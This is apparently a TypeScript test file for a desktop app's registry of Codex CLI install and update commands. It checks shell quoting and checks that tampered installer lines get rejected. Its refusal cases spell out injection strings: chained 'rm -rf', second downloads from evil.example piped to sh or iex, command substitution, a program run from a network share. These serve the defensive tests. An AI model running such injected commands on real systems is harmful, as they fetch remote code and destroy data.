// WP1.18, WP1.32 -- WP2 slice 3a (plan A9; design 8.4): the Codex install and
// update recipe registry, tested independently of any UI so a stale or
// unsafe command fails here. PURE.
//
// WP2 commit 6e review fix: the one shell line a terminal tab may type for a
// recipe is decided and built in main (recipeRunLine), from the argv, for the
// platform's terminal shell, and the accounts service hands it to the
// renderer (`runLine`) only for a recipe main allows to run. PURE: the
// service below has no registry, runs nothing and reads no file.
//
// ADR-024 (owner decision 2026-10-10): the vendor's own installer may run
// too, as its documented line, which names the one HTTPS address fixed in
// code beside it, only after a confirmation that names that address's host.
// It comes first, npm second. Every line ends its shell when its command
// ends, however it ends (in PowerShell an error or Ctrl+C too), so the
// surface that opened the tab sees it end and checks again. An installer
// command must be exactly one of the documented shapes filled in with its
// address (review fix, 2026-10-10).
import { describe, it, expect, vi } from 'vitest'
import { codexInstallRecipes, codexInstallKind, CODEX_INSTALL_SOURCE_URL, CODEX_README_COMMIT } from '../../src/main/providers/codex'
import {
  AccountsService, ConsumerLeaseRegistry, SecretHandleStore, recipeRunLine, installRecipeView, vendorScriptHost,
  WINDOWS_RUN_LINE_START, WINDOWS_RUN_LINE_END, POSIX_RUN_LINE_END, VENDOR_SCRIPT_SHAPES,
} from '../../src/main/providers/core'
import type { InstallRecipe, ProviderPackage } from '../../src/main/providers/core'
import type { CapabilityPlatform } from '../../src/shared/providers'

const platforms = ['win32', 'darwin', 'linux'] as const
const PS1_URL = 'https://chatgpt.com/codex/install.ps1'
const SH_URL = 'https://chatgpt.com/codex/install.sh'
const PS1_LINE = 'powershell -ExecutionPolicy ByPass -c "irm https://chatgpt.com/codex/install.ps1 | iex"'
const SH_LINE = 'curl -fsSL https://chatgpt.com/codex/install.sh | sh'
/** A command as the Windows install tab types it: inside the try that ends the shell however it ends. */
const WIN = (cmd: string) => `$failed = $true; try { ${cmd}; $failed = $false } catch { $_ } finally { if ($failed) { exit 1 } }; exit $LASTEXITCODE`

describe('the Codex recipe registry', () => {
  it('every platform can install and update through a package manager the user confirms', () => {
    for (const p of platforms) {
      const r = codexInstallRecipes(p)
      expect(r.some((x) => x.purpose === 'install' && x.autoRunAllowed && x.method === 'package-manager'), p).toBe(true)
      expect(r.some((x) => x.purpose === 'update' && x.autoRunAllowed), p).toBe(true)
      expect(r.every((x) => x.providerId === 'codex' && x.platform === p && x.publisher === 'OpenAI')).toBe(true)
    }
  })

  it('recipes are the README commands verbatim, from the pinned commit; on Windows npm is named npm.cmd', () => {
    expect(CODEX_README_COMMIT).toMatch(/^[0-9a-f]{40}$/)
    expect(CODEX_INSTALL_SOURCE_URL).toBe(`https://github.com/openai/codex/blob/${CODEX_README_COMMIT}/README.md`)
    const shown = (on: readonly CapabilityPlatform[]) =>
      [...new Set(on.flatMap((p) => codexInstallRecipes(p).filter((r) => r.purpose === 'install').map((r) => r.displayCommand)))].sort()
    expect(shown(['darwin', 'linux'])).toEqual([
      'brew install --cask codex',
      SH_LINE,
      'npm install -g @openai/codex',
    ])
    expect(shown(['win32'])).toEqual([
      'npm.cmd install -g @openai/codex',
      PS1_LINE,
    ])
  })

  it("OpenAI's own installer comes first, then npm (then Homebrew on a Mac), as the README lists them", () => {
    const ids = (p: CapabilityPlatform, purpose: 'install' | 'update') => codexInstallRecipes(p).filter((r) => r.purpose === purpose).map((r) => r.id)
    expect(ids('win32', 'install')).toEqual(['codex-script-install-ps1', 'codex-npm-install'])
    expect(ids('darwin', 'install')).toEqual(['codex-script-install-sh', 'codex-npm-install', 'codex-brew-install'])
    expect(ids('linux', 'install')).toEqual(['codex-script-install-sh', 'codex-npm-install'])
    expect(ids('win32', 'update')).toEqual(['codex-script-update-ps1', 'codex-npm-update'])
    expect(ids('darwin', 'update')).toEqual(['codex-script-update-sh', 'codex-npm-update', 'codex-brew-update'])
    expect(ids('linux', 'update')).toEqual(['codex-script-update-sh', 'codex-npm-update'])
  })

  it('Windows shows the npm install and update as npm.cmd, so Copy gives a line PowerShell runs under its default script policy; macOS and Linux show npm', () => {
    expect(byId('win32', 'codex-npm-install').displayCommand).toBe('npm.cmd install -g @openai/codex')
    expect(byId('win32', 'codex-npm-update').displayCommand).toBe('npm.cmd install -g @openai/codex@latest')
    for (const p of ['darwin', 'linux'] as const) {
      expect(byId(p, 'codex-npm-install').displayCommand, p).toBe('npm install -g @openai/codex')
      expect(byId(p, 'codex-npm-update').displayCommand, p).toBe('npm install -g @openai/codex@latest')
    }
  })

  it("OpenAI's installer may run: as its documented line, naming its one HTTPS address fixed beside it, with no argv", () => {
    for (const p of platforms) {
      const scripts = codexInstallRecipes(p).filter((x) => x.method === 'script')
      expect(scripts.length, p).toBe(2)
      for (const r of scripts) {
        const url = p === 'win32' ? PS1_URL : SH_URL
        expect(r.autoRunAllowed, r.id).toBe(true)
        expect(r.command, r.id).toBeNull()
        expect(r.scriptUrl, r.id).toBe(url)
        expect(r.displayCommand, r.id).toBe(p === 'win32' ? PS1_LINE : SH_LINE)
        expect(vendorScriptHost(r), r.id).toBe('chatgpt.com')
        expect(r.mayElevate, r.id).toBe(false)
        expect(r.note, r.id).toMatch(/downloads a script from chatgpt\.com and runs it/)
        expect(r.note, r.id).not.toMatch(/does not run it/)
        // Its closing question would hold the tab open (ux review, 2026-10-10).
        expect(r.note, r.id).toMatch(/When it asks whether to start Codex now, answer N: the app checks again when it ends\./)
      }
    }
  })

  it('what may run as a package manager is argv with no shell and no interpolation: the displayed text split exactly, npm named npm.cmd on Windows', () => {
    for (const p of platforms) {
      for (const r of codexInstallRecipes(p).filter((x) => x.method === 'package-manager')) {
        expect(r.autoRunAllowed, r.id).toBe(true)
        expect(r.command, r.id).not.toBeNull()
        expect(['npm', 'brew'], r.id).toContain(r.command![0])
        const [program, ...args] = r.command!
        const named = p === 'win32' && program === 'npm' ? 'npm.cmd' : program
        expect([named, ...args].join(' '), `${p} ${r.id}`).toBe(r.displayCommand)
        expect(r.command!.every((a) => /^[A-Za-z0-9@./:_-]+$/.test(a)), r.id).toBe(true)
        expect(r.scriptUrl, r.id).toBeUndefined()
      }
    }
  })

  it('npm says honestly where it may ask for administrator rights (a system prefix outside Windows)', () => {
    const npmOn = (p: (typeof platforms)[number]) => codexInstallRecipes(p).find((r) => r.id === 'codex-npm-install')!
    expect(npmOn('win32').mayElevate).toBe(false)
    expect(npmOn('darwin').mayElevate).toBe(true)
    expect(npmOn('linux').mayElevate).toBe(true)
  })

  it('ids are unique and platform-specific recipes appear only on their platform', () => {
    for (const p of platforms) {
      const ids = codexInstallRecipes(p).map((r) => r.id)
      expect(new Set(ids).size).toBe(ids.length)
    }
    expect(codexInstallRecipes('win32').some((r) => r.displayCommand.startsWith('brew'))).toBe(false)
    expect(codexInstallRecipes('linux').some((r) => r.displayCommand.startsWith('powershell'))).toBe(false)
  })
})

// --- Upgrade walk D1: the update updates the install discovery resolved -----

describe('the update offered is the one for the install sessions run', () => {
  const STANDALONE_WIN = 'C:\\Users\\u\\.codex\\packages\\standalone\\releases\\0.142.4\\bin\\codex.exe'
  const updates = (p: CapabilityPlatform, executable?: string) =>
    codexInstallRecipes(p, executable ? { executable } : {}).filter((r) => r.purpose === 'update').map((r) => r.id)

  it('tells the kind of install from the canonical path alone', () => {
    expect(codexInstallKind(STANDALONE_WIN)).toBe('standalone')
    expect(codexInstallKind('C:\\Users\\u\\AppData\\Local\\Programs\\OpenAI\\Codex\\bin\\codex.exe')).toBe('standalone')
    expect(codexInstallKind('/Users/u/.codex/packages/standalone/current/bin/codex')).toBe('standalone')
    expect(codexInstallKind('C:\\Users\\u\\AppData\\Roaming\\npm\\codex.cmd')).toBe('npm')
    expect(codexInstallKind('/usr/local/lib/node_modules/@openai/codex/bin/codex.js')).toBe('npm')
    expect(codexInstallKind('/opt/homebrew/Caskroom/codex/0.155.1/codex-aarch64-apple-darwin')).toBe('brew')
    for (const other of ['C:\\Tools\\codex.exe', '/usr/bin/codex', '', undefined]) expect(codexInstallKind(other), String(other)).toBe('unknown')
  })

  it("walk fix W5: npm only in npm's own global layout; a Homebrew formula and another package manager's global are unknown", () => {
    // npm: a POSIX prefix (system, a Node version manager's, Homebrew node's), and Windows' default prefix.
    for (const npm of [
      '/usr/local/lib/node_modules/@openai/codex/bin/codex.js',
      '/home/u/.nvm/versions/node/v22.1.0/lib/node_modules/@openai/codex/bin/codex.js',
      '/opt/homebrew/lib/node_modules/@openai/codex/bin/codex.js',
      'C:\\Users\\u\\AppData\\Roaming\\npm\\node_modules\\@openai\\codex\\bin\\codex.js',
      'C:\\Users\\u\\AppData\\Roaming\\npm\\codex.ps1',
    ]) expect(codexInstallKind(npm), npm).toBe('npm')
    // Not npm's: bun, pnpm (its global folder, its store, its Windows shim), Yarn.
    for (const other of [
      '/Users/u/.bun/install/global/node_modules/@openai/codex/bin/codex.js',
      'C:\\Users\\u\\.bun\\install\\global\\node_modules\\@openai\\codex\\bin\\codex.js',
      '/home/u/.local/share/pnpm/global/5/node_modules/@openai/codex/bin/codex.js',
      '/home/u/.local/share/pnpm/global/5/.pnpm/@openai+codex@0.155.1/node_modules/@openai/codex/bin/codex.js',
      'C:\\Users\\u\\AppData\\Local\\pnpm\\global\\5\\node_modules\\@openai\\codex\\bin\\codex.js',
      'C:\\Users\\u\\AppData\\Local\\pnpm\\codex.cmd',
      '/home/u/.config/yarn/global/node_modules/@openai/codex/bin/codex.js',
    ]) expect(codexInstallKind(other), other).toBe('unknown')
    // A Homebrew formula, on a Mac or Linuxbrew: unknown, so every update is
    // shown rather than the cask upgrade, which fails on a formula.
    expect(codexInstallKind('/opt/homebrew/Cellar/codex/0.155.1/bin/codex')).toBe('unknown')
    expect(codexInstallKind('/home/linuxbrew/.linuxbrew/Cellar/codex/0.155.1/bin/codex')).toBe('unknown')
    expect(updates('darwin', '/opt/homebrew/Cellar/codex/0.155.1/bin/codex')).toEqual(['codex-script-update-sh', 'codex-npm-update', 'codex-brew-update'])
    expect(updates('linux', '/home/linuxbrew/.linuxbrew/Cellar/codex/0.155.1/bin/codex')).toEqual(['codex-script-update-sh', 'codex-npm-update'])
    expect(updates('linux', '/home/u/.config/yarn/global/node_modules/@openai/codex/bin/codex.js')).toEqual(['codex-script-update-sh', 'codex-npm-update'])
    // The cask still gets the cask upgrade alone.
    expect(updates('darwin', '/opt/homebrew/Caskroom/codex/0.155.1/codex-aarch64-apple-darwin')).toEqual(['codex-brew-update'])
  })

  it('a standalone install gets its own installer run again, never npm; npm and Homebrew get theirs', () => {
    expect(updates('win32', STANDALONE_WIN)).toEqual(['codex-script-update-ps1'])
    expect(updates('darwin', '/Users/u/.codex/packages/standalone/current/bin/codex')).toEqual(['codex-script-update-sh'])
    expect(updates('win32', 'C:\\Users\\u\\AppData\\Roaming\\npm\\codex.cmd')).toEqual(['codex-npm-update'])
    expect(updates('darwin', '/opt/homebrew/Caskroom/codex/0.155.1/codex')).toEqual(['codex-brew-update'])
    // Not known, or not resolved yet: every update, each saying which install it updates.
    expect(updates('win32', 'C:\\Tools\\codex.exe')).toEqual(['codex-script-update-ps1', 'codex-npm-update'])
    expect(updates('darwin')).toEqual(['codex-script-update-sh', 'codex-npm-update', 'codex-brew-update'])
    // The installs never change with it.
    for (const exe of [STANDALONE_WIN, undefined]) {
      expect(codexInstallRecipes('win32', exe ? { executable: exe } : {}).filter((r) => r.purpose === 'install').map((r) => r.id)).toEqual(['codex-script-install-ps1', 'codex-npm-install'])
    }
  })

  it('walk fix X2: listed for an install it cannot tell, every update says which install it updates', () => {
    for (const p of ['win32', 'darwin', 'linux'] as const) {
      const shown = codexInstallRecipes(p).filter((r) => r.purpose === 'update')
      expect(shown.length, p).toBeGreaterThan(1)
      for (const r of shown) expect(r.note, `${p} ${r.id}`).toMatch(/^Updates (an npm installation|a Homebrew cask \(not a formula\)|a Codex this script installed)[.:]/)
    }
    expect(codexInstallRecipes('darwin').find((r) => r.id === 'codex-brew-update')!.note).toBe('Updates a Homebrew cask (not a formula).')
  })

  it("the standalone update is OpenAI's installer, run again through its documented line", () => {
    const r = codexInstallRecipes('win32', { executable: STANDALONE_WIN }).find((x) => x.purpose === 'update')!
    expect(r).toMatchObject({ method: 'script', command: null, autoRunAllowed: true, scriptUrl: PS1_URL })
    expect(r.displayCommand).toBe(codexInstallRecipes('win32').find((x) => x.id === 'codex-script-install-ps1')!.displayCommand)
    expect(r.note).toMatch(/Updates a Codex this script installed/)
    expect(recipeRunLine(r, 'win32')).toBe(WIN(PS1_LINE))
    // Walk fix W8: the same for the sh installer, on both platforms it runs on.
    for (const p of ['darwin', 'linux'] as const) {
      const sh = codexInstallRecipes(p, { executable: '/Users/u/.codex/packages/standalone/current/bin/codex' }).find((x) => x.purpose === 'update')!
      expect(sh.id).toBe('codex-script-update-sh')
      expect(sh).toMatchObject({ method: 'script', command: null, autoRunAllowed: true, scriptUrl: SH_URL })
      expect(sh.displayCommand).toBe(codexInstallRecipes(p).find((x) => x.id === 'codex-script-install-sh')!.displayCommand)
      expect(sh.displayCommand).toBe(SH_LINE)
      expect(sh.note).toMatch(/Updates a Codex this script installed/)
      expect(recipeRunLine(sh, p)).toBe(`${SH_LINE}; exit`)
    }
  })
})

// --- WP2 commit 6e review fix: the line the terminal tab types --------------

type Runnable = Pick<InstallRecipe, 'method' | 'autoRunAllowed' | 'command'> & Partial<Pick<InstallRecipe, 'displayCommand' | 'scriptUrl'>>
const recipe = (over: Partial<Runnable> = {}): Runnable => ({ method: 'package-manager', autoRunAllowed: true, command: ['npm', 'install', '-g', '@openai/codex'], ...over })
const script = (over: Partial<Runnable> = {}): Runnable => ({ method: 'script', autoRunAllowed: true, command: null, displayCommand: 'curl -fsSL https://vendor.example/install.sh | sh', scriptUrl: 'https://vendor.example/install.sh', ...over })
const byId = (p: CapabilityPlatform, id: string) => codexInstallRecipes(p).find((r) => r.id === id)!

describe('recipeRunLine: what a terminal tab may type for a recipe', () => {
  it('Windows: npm is typed as npm.cmd (PowerShell would load npm.ps1, which the default execution policy refuses), every argument single-quoted', () => {
    expect(recipeRunLine(byId('win32', 'codex-npm-install'), 'win32')).toBe(WIN("npm.cmd 'install' '-g' '@openai/codex'"))
    expect(recipeRunLine(byId('win32', 'codex-npm-update'), 'win32')).toBe(WIN("npm.cmd 'install' '-g' '@openai/codex@latest'"))
  })

  it('macOS and Linux: npm unchanged, arguments single-quoted; brew on macOS', () => {
    for (const p of ['darwin', 'linux'] as const) {
      expect(recipeRunLine(byId(p, 'codex-npm-install'), p), p).toBe("npm 'install' '-g' '@openai/codex'; exit")
      expect(recipeRunLine(byId(p, 'codex-npm-update'), p), p).toBe("npm 'install' '-g' '@openai/codex@latest'; exit")
    }
    expect(recipeRunLine(byId('darwin', 'codex-brew-install'), 'darwin')).toBe("brew 'install' '--cask' 'codex'; exit")
    expect(recipeRunLine(byId('darwin', 'codex-brew-update'), 'darwin')).toBe("brew 'upgrade' '--cask' 'codex'; exit")
  })

  it('every line ends its shell however its command ends, so the tab is seen to end: PowerShell inside a try whose finally exits on an error or Ctrl+C, POSIX with exit', () => {
    expect(WINDOWS_RUN_LINE_START).toBe('$failed = $true; try { ')
    expect(WINDOWS_RUN_LINE_END).toBe('; $failed = $false } catch { $_ } finally { if ($failed) { exit 1 } }; exit $LASTEXITCODE')
    expect(POSIX_RUN_LINE_END).toBe('; exit')
    for (const p of platforms) {
      for (const r of codexInstallRecipes(p)) {
        const line = recipeRunLine(r, p)!
        expect(line, `${p} ${r.id}`).toBeDefined()
        if (p === 'win32') {
          expect(line.startsWith(WINDOWS_RUN_LINE_START), r.id).toBe(true)
          expect(line.endsWith(WINDOWS_RUN_LINE_END), r.id).toBe(true)
          expect(line.slice(WINDOWS_RUN_LINE_START.length, -WINDOWS_RUN_LINE_END.length), r.id).not.toMatch(/exit|try|finally/)
        } else {
          expect(line.endsWith(POSIX_RUN_LINE_END), `${p} ${r.id}`).toBe(true)
          expect(line.split('; exit').length, `${p} ${r.id}`).toBe(2)
        }
      }
    }
  })

  it("OpenAI's installer is typed as the README writes it, character for character, then ended the same way", () => {
    expect(recipeRunLine(byId('win32', 'codex-script-install-ps1'), 'win32')).toBe(WIN(PS1_LINE))
    for (const p of ['darwin', 'linux'] as const) expect(recipeRunLine(byId(p, 'codex-script-install-sh'), p), p).toBe(`${SH_LINE}; exit`)
  })

  it('a script gets a line only when its documented line is a documented shape around its one fixed https address', () => {
    expect(recipeRunLine(script(), 'linux')).toBe('curl -fsSL https://vendor.example/install.sh | sh; exit')
    expect(vendorScriptHost(script())).toBe('vendor.example')
    // Each documented shape, filled in with the address, is accepted.
    expect(VENDOR_SCRIPT_SHAPES.map((shape) => shape('https://vendor.example/install.x'))).toEqual([
      'irm https://vendor.example/install.x | iex',
      'curl -fsSL https://vendor.example/install.x | bash',
      'curl -fsSL https://vendor.example/install.x | sh',
      'powershell -ExecutionPolicy ByPass -c "irm https://vendor.example/install.x | iex"',
    ])
    for (const shape of VENDOR_SCRIPT_SHAPES) {
      expect(vendorScriptHost(script({ displayCommand: shape('https://vendor.example/install.sh') }))).toBe('vendor.example')
    }
    const refused: Array<[string, Partial<Runnable>]> = [
      ['no fixed address', { scriptUrl: undefined }],
      ['not https', { scriptUrl: 'http://vendor.example/install.sh', displayCommand: 'curl -fsSL http://vendor.example/install.sh | sh' }],
      ['the line names another address', { displayCommand: 'curl -fsSL https://elsewhere.example/install.sh | sh' }],
      ['the line names a second address', { displayCommand: 'curl -fsSL https://vendor.example/install.sh | sh; curl https://elsewhere.example/x | sh' }],
      ['the address hides in a longer one', { displayCommand: 'curl -fsSL https://vendor.example/install.sh.evil | sh' }],
      ['an address with a user', { scriptUrl: 'https://u@vendor.example/install.sh', displayCommand: 'curl https://u@vendor.example/install.sh | sh' }],
      ['an address with a port', { scriptUrl: 'https://vendor.example:8443/install.sh', displayCommand: 'curl https://vendor.example:8443/install.sh | sh' }],
      ['an address with a query', { scriptUrl: 'https://vendor.example/install.sh?x=1', displayCommand: 'curl https://vendor.example/install.sh?x=1 | sh' }],
      ['a second line', { displayCommand: 'curl -fsSL https://vendor.example/install.sh | sh\nrm -rf x' }],
      ['a control character', { displayCommand: 'curl -fsSL https://vendor.example/install.sh | sh' + String.fromCharCode(27) }],
      // bypass and injection MINOR 1 (2026-10-10): only the documented shapes.
      ['a second fetch with no scheme', { displayCommand: 'curl -fsSL https://vendor.example/install.sh | sh; curl -fsSL evil.example/x | sh' }],
      ['a second irm with no scheme', { displayCommand: 'irm https://vendor.example/install.sh | iex; irm evil.example/x | iex' }],
      ['a chained command', { displayCommand: 'curl -fsSL https://vendor.example/install.sh | sh && rm -rf ~/x' }],
      ['a command after it', { displayCommand: 'irm https://vendor.example/install.sh | iex; Remove-Item x' }],
      ['a program on a share after it', { displayCommand: 'irm https://vendor.example/install.sh | iex; & ' + String.fromCharCode(92, 92) + 'evil' + String.fromCharCode(92) + 'x.exe' }],
      ['a substitution', { displayCommand: 'curl -fsSL https://vendor.example/install.sh`id` | sh' }],
      ['another downloader', { displayCommand: 'wget -qO- https://vendor.example/install.sh | sh' }],
      ['another flag', { displayCommand: 'curl -fsSLk https://vendor.example/install.sh | sh' }],
      ['a right-to-left mark', { displayCommand: 'curl -fsSL https://vendor.example/install.sh | sh' + String.fromCharCode(0x202e) }],
      ['a line separator', { displayCommand: 'curl -fsSL https://vendor.example/install.sh | sh' + String.fromCharCode(0x2028) + 'id' }],
      ['not allowed to run', { autoRunAllowed: false }],
      ['an installer, not a script', { method: 'installer' }],
    ]
    for (const [why, over] of refused) {
      expect(recipeRunLine(script(over), 'linux'), why).toBeUndefined()
      expect(recipeRunLine(script(over), 'win32'), why).toBeUndefined()
    }
  })

  it('no line without all three: a package manager, autoRunAllowed, and an argv', () => {
    for (const p of platforms) {
      expect(recipeRunLine(recipe({ command: null }), p)).toBeUndefined()
      expect(recipeRunLine(recipe({ command: [] }), p)).toBeUndefined()
      expect(recipeRunLine(recipe({ autoRunAllowed: false }), p)).toBeUndefined()
      expect(recipeRunLine(recipe({ method: 'installer' }), p)).toBeUndefined()
      expect(recipeRunLine(recipe({ method: 'script' }), p)).toBeUndefined()
    }
  })

  it('built from the argv, never from the text the user is shown', () => {
    const shown = { ...byId('win32', 'codex-npm-install'), displayCommand: 'npm install -g @openai/codex; Remove-Item x' }
    expect(recipeRunLine(shown, 'win32')).toBe(WIN("npm.cmd 'install' '-g' '@openai/codex'"))
  })

  it('the program must be a plain word typed bare; anything else gets no line', () => {
    for (const program of ['npm;calc', 'C:/Tools/npm', 'C:' + String.fromCharCode(92) + 'npm', '&npm', '-npm', 'n pm', '']) {
      expect(recipeRunLine(recipe({ command: [program, 'install'] }), 'win32'), program).toBeUndefined()
    }
  })

  it('an argument is literal in that shell: quotes escaped, nothing expanded', () => {
    expect(recipeRunLine(recipe({ command: ['npm', "it's", '$(calc)', '@x/y'] }), 'win32')).toBe(WIN("npm.cmd 'it''s' '$(calc)' '@x/y'"))
    // POSIX: a single quote closes, is escaped, and reopens: 'it'\''s'.
    const BS = String.fromCharCode(92)
    expect(recipeRunLine(recipe({ command: ['npm', "it's", '$(calc)', '@x/y'] }), 'linux')).toBe(`npm 'it'${BS}''s' '$(calc)' '@x/y'; exit`)
  })
})

describe('the accounts service hands the renderer a line only for a recipe main allows to run', () => {
  const serviceOn = (platform: CapabilityPlatform, recipes: (p: CapabilityPlatform) => readonly InstallRecipe[] = codexInstallRecipes, nodeToolsFound?: () => Promise<boolean>) => {
    const pkg = {
      id: 'codex',
      setup: { discover: async () => ({ state: 'missing', compatibility: 'unknown', checkedAt: 0 }), installRecipes: recipes },
    } as unknown as ProviderPackage
    return new AccountsService({
      store: () => null,
      leases: new ConsumerLeaseRegistry(),
      secrets: new SecretHandleStore({ now: () => 0 }),
      packages: () => [pkg],
      preference: () => 'on',
      platform,
      randomHex: () => '0'.repeat(32),
      ...(nodeToolsFound ? { nodeToolsFound } : {}),
    })
  }

  it('each platform: a line for every runnable recipe, built for that platform; the shown command verbatim; never an argv', () => {
    for (const p of platforms) {
      const views = serviceOn(p).installRecipes('codex')
      const source = codexInstallRecipes(p)
      expect(views.map((v) => v.id), p).toEqual(source.map((r) => r.id))
      for (const v of views) {
        const r = source.find((x) => x.id === v.id)!
        expect(v.displayCommand, v.id).toBe(r.displayCommand)
        expect('command' in v, v.id).toBe(false)
        expect('scriptUrl' in v, v.id).toBe(false)
        expect(v.runLine, `${p} ${v.id}`).toBe(recipeRunLine(r, p))
        expect(v.runLine, `${p} ${v.id}`).toBeDefined()
        // The installer names where it downloads from, for the confirmation.
        if (r.method === 'script') expect(v.downloadsFrom, v.id).toBe('chatgpt.com')
        else expect('downloadsFrom' in v, v.id).toBe(false)
        expect('needsNode' in v, v.id).toBe(false)
        expect(v).toEqual(installRecipeView(r, p))
      }
    }
    const win = serviceOn('win32').installRecipes('codex')
    expect(win.find((v) => v.id === 'codex-npm-install')!.runLine).toBe(WIN("npm.cmd 'install' '-g' '@openai/codex'"))
    expect(win.find((v) => v.id === 'codex-script-install-ps1')!.runLine).toBe(WIN(PS1_LINE))
  })

  it('the update the service hands over is the one for the install its last check resolved (the path stays in main)', async () => {
    const standalone = 'C:\\Users\\u\\.codex\\packages\\standalone\\current\\bin\\codex.exe'
    const pkg = {
      id: 'codex',
      setup: {
        discover: async () => ({ state: 'found', executable: standalone, version: '0.142.4', compatibility: 'too-old', checkedAt: 1 }),
        installRecipes: codexInstallRecipes,
      },
    } as unknown as ProviderPackage
    const svc = new AccountsService({
      store: () => null, leases: new ConsumerLeaseRegistry(), secrets: new SecretHandleStore({ now: () => 0 }),
      packages: () => [pkg], preference: () => 'on', platform: 'win32', randomHex: () => '0'.repeat(32),
    })
    // Before any check: every update.
    expect(svc.installRecipes('codex').filter((v) => v.purpose === 'update').map((v) => v.id)).toEqual(['codex-script-update-ps1', 'codex-npm-update'])
    expect((await svc.discover('codex')).ok).toBe(true)
    const after = svc.installRecipes('codex')
    expect(after.filter((v) => v.purpose === 'update').map((v) => v.id)).toEqual(['codex-script-update-ps1'])
    expect(JSON.stringify(after)).not.toContain('packages')
  })

  it('a package-manager recipe that says it may run but carries no argv gets no line', () => {
    const noArgv = (p: CapabilityPlatform) => codexInstallRecipes(p).map((r) => (r.method === 'package-manager' ? { ...r, command: null } : r))
    for (const v of serviceOn('win32', noArgv).installRecipes('codex')) {
      if (v.method === 'package-manager') expect('runLine' in v, v.id).toBe(false)
    }
  })

  it('Node.js not found: every npm recipe says so and keeps its line; nothing else is marked', () => {
    for (const p of platforms) {
      for (const v of serviceOn(p).installRecipes('codex', { nodeFound: false })) {
        const npm = v.id.startsWith('codex-npm-')
        expect(v.needsNode === true, `${p} ${v.id}`).toBe(npm)
        expect(v.runLine, `${p} ${v.id}`).toBeDefined()
      }
    }
  })

  it('Node.js found, or not asked: the list is exactly as before', () => {
    for (const p of platforms) {
      const plain = serviceOn(p).installRecipes('codex')
      expect(serviceOn(p).installRecipes('codex', { nodeFound: true }), p).toEqual(plain)
      expect(plain.some((v) => 'needsNode' in v), p).toBe(false)
    }
  })

  it('the checked list asks for Node.js only when a recipe runs npm, and a check that fails changes nothing', async () => {
    const found = vi.fn(async () => false)
    const scriptsOnly = (p: CapabilityPlatform) => codexInstallRecipes(p).filter((r) => r.method === 'script')
    expect((await serviceOn('win32', scriptsOnly, found).installRecipesChecked('codex')).some((v) => v.needsNode)).toBe(false)
    expect(found).not.toHaveBeenCalled()

    const marked = await serviceOn('win32', codexInstallRecipes, found).installRecipesChecked('codex')
    expect(found).toHaveBeenCalledTimes(1)
    expect(marked.filter((v) => v.needsNode).map((v) => v.id)).toEqual(['codex-npm-install', 'codex-npm-update'])

    const throws = vi.fn(async () => { throw new Error('no answer') })
    const plain = await serviceOn('win32', codexInstallRecipes, throws).installRecipesChecked('codex')
    expect(throws).toHaveBeenCalledTimes(1)
    expect(plain).toEqual(serviceOn('win32').installRecipes('codex'))
    expect(await serviceOn('win32', codexInstallRecipes, async () => true).installRecipesChecked('codex')).toEqual(plain)
  })
})
